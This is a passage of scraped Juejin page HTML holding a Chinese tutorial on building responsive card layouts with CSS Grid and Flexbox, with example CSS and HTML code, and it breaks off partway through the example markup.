<li><a href="https://link.juejin.cn?target=https%3A%2F%2Freact.dev%2Flearn%2Fpassing-data-deeply-with-context" target="_blank" title="https://react.dev/learn/passing-data-deeply-with-context" ref="nofollow noopener noreferrer">React 官方文档 - Context API</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fzh-CN%2Fdocs%2FWeb%2FJavaScript%2FReference%2FGlobal_Objects%2FArray" target="_blank" title="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array" ref="nofollow noopener noreferrer">MDN - JavaScript Array Methods</a></li>
</ul>
<p><strong>标签：</strong> #React #状态管理 #useReducer #ContextAPI #前端开发</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[CSS Grid + Flexbox响应式复杂布局实现]]></title>    <link>https://juejin.cn/post/7581312433530470443</link>    <guid>https://juejin.cn/post/7581312433530470443</guid>    <pubDate>2025-12-09T01:50:12.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581312433530470443" data-draft-id="7581329603777609764" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="CSS Grid + Flexbox响应式复杂布局实现"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2025-12-09T01:50:12.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="dorisrv"/> <meta itemprop="url" content="https://juejin.cn/user/1522178380270712"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            CSS Grid + Flexbox响应式复杂布局实现
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1522178380270712/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    dorisrv
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T01:50:12.000Z" title="Tue Dec 09 2025 01:50:12 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    3
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读12分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">CSS Grid + Flexbox响应式复杂布局实现</h2>
<h3 data-id="heading-1">🤔 为什么需要结合CSS Grid和Flexbox？</h3>
<p>在前端布局中，CSS Grid和Flexbox是两种强大的布局工具，但它们各自擅长不同的场景：</p>
<ul>
<li><strong>Flexbox</strong>：一维布局（行或列），适合处理元素的对齐、分布和弹性伸缩</li>
<li><strong>CSS Grid</strong>：二维布局（行和列同时），适合创建复杂的网格结构和精确的元素定位</li>
</ul>
<p>结合使用这两种布局技术，我们可以：</p>
<ul>
<li>快速构建复杂的响应式界面</li>
<li>灵活处理不同尺寸和形状的元素</li>
<li>减少布局嵌套层级，提高代码可维护性</li>
<li>实现传统布局技术难以完成的复杂设计</li>
</ul>
<h3 data-id="heading-2">💡 基础概念回顾</h3>
<h4 data-id="heading-3">1. CSS Grid基础</h4>
<p>CSS Grid是一种二维布局系统，允许我们同时控制行和列：</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.container</span> {
  <span class="hljs-attribute">display</span>: grid;
  <span class="hljs-attribute">grid-template-columns</span>: <span class="hljs-number">1</span>fr <span class="hljs-number">2</span>fr <span class="hljs-number">1</span>fr; <span class="hljs-comment">/* 定义3列，比例为1:2:1 */</span>
  <span class="hljs-attribute">grid-template-rows</span>: auto <span class="hljs-number">1</span>fr auto; <span class="hljs-comment">/* 定义3行，第一行和第三行自适应内容高度，第二行占据剩余空间 */</span>
  <span class="hljs-attribute">gap</span>: <span class="hljs-number">20px</span>; <span class="hljs-comment">/* 网格线之间的间距 */</span>
  <span class="hljs-attribute">grid-template-areas</span>: <span class="hljs-comment">/* 定义网格区域 */</span>
    <span class="hljs-string">"header header header"</span>
    <span class="hljs-string">"sidebar main aside"</span>
    <span class="hljs-string">"footer footer footer"</span>;
}

<span class="hljs-selector-class">.item1</span> { <span class="hljs-attribute">grid-area</span>: header; }
<span class="hljs-selector-class">.item2</span> { <span class="hljs-attribute">grid-area</span>: sidebar; }
<span class="hljs-selector-class">.item3</span> { <span class="hljs-attribute">grid-area</span>: main; }
<span class="hljs-selector-class">.item4</span> { <span class="hljs-attribute">grid-area</span>: aside; }
<span class="hljs-selector-class">.item5</span> { <span class="hljs-attribute">grid-area</span>: footer; }
</code></pre>
<h4 data-id="heading-4">2. Flexbox基础</h4>
<p>Flexbox是一种一维布局系统，适合处理元素的对齐和分布：</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.container</span> {
  <span class="hljs-attribute">display</span>: flex;
  <span class="hljs-attribute">flex-direction</span>: row; <span class="hljs-comment">/* 主轴方向：row（行）或 column（列） */</span>
  <span class="hljs-attribute">justify-content</span>: space-between; <span class="hljs-comment">/* 主轴对齐方式：flex-start, flex-end, center, space-between, space-around, space-evenly */</span>
  <span class="hljs-attribute">align-items</span>: center; <span class="hljs-comment">/* 交叉轴对齐方式：stretch, flex-start, flex-end, center, baseline */</span>
  <span class="hljs-attribute">flex-wrap</span>: wrap; <span class="hljs-comment">/* 是否换行：nowrap（不换行）, wrap（换行）, wrap-reverse（反向换行） */</span>
  <span class="hljs-attribute">gap</span>: <span class="hljs-number">10px</span>; <span class="hljs-comment">/* 元素之间的间距 */</span>
}

<span class="hljs-selector-class">.item</span> {
  <span class="hljs-attribute">flex</span>: <span class="hljs-number">1</span> <span class="hljs-number">0</span> <span class="hljs-number">200px</span>; <span class="hljs-comment">/* 简写：flex-grow flex-shrink flex-basis */</span>
  <span class="hljs-comment">/* flex-grow: 1; 元素的放大比例 */</span>
  <span class="hljs-comment">/* flex-shrink: 0; 元素的缩小比例 */</span>
  <span class="hljs-comment">/* flex-basis: 200px; 元素的初始宽度 */</span>
}
</code></pre>
<h3 data-id="heading-5">🚀 基础实现：卡片布局</h3>
<p>让我们先通过一个简单的卡片布局，了解如何结合使用CSS Grid和Flexbox。</p>
<h4 data-id="heading-6">1. 需求分析</h4>
<p>我们需要实现一个响应式卡片布局，包含以下特点：</p>
<ul>
<li>桌面端：3列网格布局</li>
<li>平板端：2列网格布局</li>
<li>移动端：1列布局</li>
<li>卡片内部使用Flexbox实现内容的垂直对齐和分布</li>
</ul>
<h4 data-id="heading-7">2. 实现代码</h4>
<pre><code class="hljs language-html" lang="html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"zh-CN"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"viewport"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"width=device-width, initial-scale=1.0"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>CSS Grid + Flexbox 卡片布局<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css">
    <span class="hljs-comment">/* 全局样式 */</span>
    * {
      <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span>;
      <span class="hljs-attribute">padding</span>: <span class="hljs-number">0</span>;
      <span class="hljs-attribute">box-sizing</span>: border-box;
    }
    
    <span class="hljs-selector-tag">body</span> {
      <span class="hljs-attribute">font-family</span>: <span class="hljs-string">'Segoe UI'</span>, Tahoma, Geneva, Verdana, sans-serif;
      <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#f5f7fa</span>;
      <span class="hljs-attribute">color</span>: <span class="hljs-number">#333</span>;
      <span class="hljs-attribute">line-height</span>: <span class="hljs-number">1.6</span>;
    }
    
    <span class="hljs-selector-class">.container</span> {
      <span class="hljs-attribute">max-width</span>: <span class="hljs-number">1200px</span>;
      <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span> auto;
      <span class="hljs-attribute">padding</span>: <span class="hljs-number">20px</span>;
    }
    
    <span class="hljs-selector-tag">h1</span> {
      <span class="hljs-attribute">text-align</span>: center;
      <span class="hljs-attribute">margin-bottom</span>: <span class="hljs-number">30px</span>;
      <span class="hljs-attribute">color</span>: <span class="hljs-number">#2c3e50</span>;
    }
    
    <span class="hljs-comment">/* 卡片网格布局 */</span>
    <span class="hljs-selector-class">.card-grid</span> {
      <span class="hljs-attribute">display</span>: grid;
      <span class="hljs-attribute">grid-template-columns</span>: <span class="hljs-built_in">repeat</span>(auto-fit, <span class="hljs-built_in">minmax</span>(<span class="hljs-number">320px</span>, <span class="hljs-number">1</span>fr));
      <span class="hljs-attribute">gap</span>: <span class="hljs-number">25px</span>;
    }
    
    <span class="hljs-comment">/* 卡片样式 */</span>
    <span class="hljs-selector-class">.card</span> {
      <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#fff</span>;
      <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">8px</span>;
      <span class="hljs-attribute">box-shadow</span>: <span class="hljs-number">0</span> <span class="hljs-number">4px</span> <span class="hljs-number">12px</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0.08</span>);
      <span class="hljs-attribute">overflow</span>: hidden;
      <span class="hljs-attribute">transition</span>: transform <span class="hljs-number">0.3s</span> ease, box-shadow <span class="hljs-number">0.3s</span> ease;
      <span class="hljs-attribute">display</span>: flex;
      <span class="hljs-attribute">flex-direction</span>: column;
    }
    
    <span class="hljs-selector-class">.card</span><span class="hljs-selector-pseudo">:hover</span> {
      <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translateY</span>(-<span class="hljs-number">5px</span>);
      <span class="hljs-attribute">box-shadow</span>: <span class="hljs-number">0</span> <span class="hljs-number">8px</span> <span class="hljs-number">24px</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0.12</span>);
    }
    
    <span class="hljs-comment">/* 卡片图片 */</span>
    <span class="hljs-selector-class">.card-img</span> {
      <span class="hljs-attribute">width</span>: <span class="hljs-number">100%</span>;
      <span class="hljs-attribute">height</span>: <span class="hljs-number">200px</span>;
      <span class="hljs-attribute">object-fit</span>: cover;
    }
    
    <span class="hljs-comment">/* 卡片内容 */</span>
    <span class="hljs-selector-class">.card-content</span> {
      <span class="hljs-attribute">padding</span>: <span class="hljs-number">20px</span>;
      <span class="hljs-attribute">flex</span>: <span class="hljs-number">1</span>;
      <span class="hljs-attribute">display</span>: flex;
      <span class="hljs-attribute">flex-direction</span>: column;
    }
    
    <span class="hljs-selector-class">.card-title</span> {
      <span class="hljs-attribute">font-size</span>: <span class="hljs-number">1.5rem</span>;
      <span class="hljs-attribute">margin-bottom</span>: <span class="hljs-number">10px</span>;
      <span class="hljs-attribute">color</span>: <span class="hljs-number">#2c3e50</span>;
    }
    
    <span class="hljs-selector-class">.card-description</span> {
      <span class="hljs-attribute">font-size</span>: <span class="hljs-number">1rem</span>;
      <span class="hljs-attribute">color</span>: <span class="hljs-number">#7f8c8d</span>;
      <span class="hljs-attribute">margin-bottom</span>: <span class="hljs-number">15px</span>;
      <span class="hljs-attribute">flex</span>: <span class="hljs-number">1</span>;
    }
    
    <span class="hljs-comment">/* 卡片标签 */</span>
    <span class="hljs-selector-class">.card-tags</span> {
      <span class="hljs-attribute">display</span>: flex;
      <span class="hljs-attribute">flex-wrap</span>: wrap;
      <span class="hljs-attribute">gap</span>: <span class="hljs-number">8px</span>;
      <span class="hljs-attribute">margin-bottom</span>: <span class="hljs-number">15px</span>;
    }
    
    <span class="hljs-selector-class">.tag</span> {
      <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#e3f2fd</span>;
      <span class="hljs-attribute">color</span>: <span class="hljs-number">#1976d2</span>;
      <span class="hljs-attribute">padding</span>: <span class="hljs-number">4px</span> <span class="hljs-number">12px</span>;
      <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">12px</span>;
      <span class="hljs-attribute">font-size</span>: <span class="hljs-number">0.8rem</span>;
      <span class="hljs-attribute">font-weight</span>: <span class="hljs-number">500</span>;
    }
    
    <span class="hljs-comment">/* 卡片按钮 */</span>
    <span class="hljs-selector-class">.card-btn</span> {
      <span class="hljs-attribute">display</span>: inline-block;
      <span class="hljs-attribute">padding</span>: <span class="hljs-number">10px</span> <span class="hljs-number">20px</span>;
      <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#3498db</span>;
      <span class="hljs-attribute">color</span>: <span class="hljs-number">#fff</span>;
      <span class="hljs-attribute">text-decoration</span>: none;
      <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">4px</span>;
      <span class="hljs-attribute">font-weight</span>: <span class="hljs-number">500</span>;
      <span class="hljs-attribute">transition</span>: background-color <span class="hljs-number">0.3s</span> ease;
      <span class="hljs-attribute">text-align</span>: center;
    }
    
    <span class="hljs-selector-class">.card-btn</span><span class="hljs-selector-pseudo">:hover</span> {
      <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#2980b9</span>;
    }
    
    <span class="hljs-comment">/* 响应式设计 */</span>
    <span class="hljs-keyword">@media</span> (<span class="hljs-attribute">max-width</span>: <span class="hljs-number">768px</span>) {
      <span class="hljs-selector-class">.card-grid</span> {
        <span class="hljs-attribute">grid-template-columns</span>: <span class="hljs-built_in">repeat</span>(auto-fit, <span class="hljs-built_in">minmax</span>(<span class="hljs-number">280px</span>, <span class="hljs-number">1</span>fr));
        <span class="hljs-attribute">gap</span>: <span class="hljs-number">20px</span>;
      }
      
      <span class="hljs-selector-class">.card-title</span> {
        <span class="hljs-attribute">font-size</span>: <span class="hljs-number">1.3rem</span>;
      }
    }
    
    <span class="hljs-keyword">@media</span> (<span class="hljs-attribute">max-width</span>: <span class="hljs-number">480px</span>) {
      <span class="hljs-selector-class">.container</span> {
        <span class="hljs-attribute">padding</span>: <span class="hljs-number">10px</span>;
      }
      
      <span class="hljs-selector-class">.card-grid</span> {
        <span class="hljs-attribute">grid-template-columns</span>: <span class="hljs-number">1</span>fr;
        <span class="hljs-attribute">gap</span>: <span class="hljs-number">15px</span>;
      }
      
      <span class="hljs-selector-class">.card-content</span> {
        <span class="hljs-attribute">padding</span>: <span class="hljs-number">15px</span>;
      }
    }
  </span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"container"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>CSS Grid + Flexbox 卡片布局<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
    
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"card-grid"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"card"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://picsum.photos/seed/card1/600/400"</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">"卡片图片"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"card-img"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"card-content"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"card-title"</span>&gt;</span>React Hooks 实战<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"card-description"</span>&gt;</span>深入学习 React Hooks 的使用技巧和最佳实践，掌握现代 React 开发的核心能力。<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"card-tags"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"tag"</span>&gt;</span>React<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"tag"</span>&gt;</span>Hooks<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"tag"</span>&gt;</span>前端开发<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
          <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"card-btn"</span>&gt;</span>查看详情<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"card"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://picsum.photos/seed/card2/600/400"</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">"卡片图片"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"card-img"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"card-content"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"card-title"</span>&gt;</span>TypeScript 进阶<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"card-description"</span>&gt;</span>从基础到高级，全面掌握 TypeScript 的类型系统和高级特性，提升代码质量和开发效率。<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"card-tags"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"tag"</span>&gt;</span>TypeScript<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"tag"</span>&gt;</span>JavaScript<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"tag"</span>&gt;</span>类型系统<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
          <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"card-btn"</span>&gt;</span>查看详情<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"card"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://picsum.photos/seed/card3/600/400"</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">"卡片图片"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"card-img"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"card-content"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"card-title"</span>&gt;</span>前端工程化<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"card-description"</span>&gt;</span>学习前端工程化的最佳实践，包括构建工具、模块化开发、自动化测试等内容。<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"card-tags"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"tag"</span>&gt;</span>Webpack<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"tag"</span>&gt;</span>工程化<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"tag"</span>&gt;</span>自动化<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
          <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"card-btn"</span>&gt;</span>查看详情<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"card"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://picsum.photos/seed/card4/600/400"</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">"卡片图片"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"card-img"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"card-content"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"card-title"</span>&gt;</span>响应式设计<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"card-description"</span>&gt;</span>掌握现代响应式设计的技术和方法，创建适配各种设备的优秀用户界面。<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
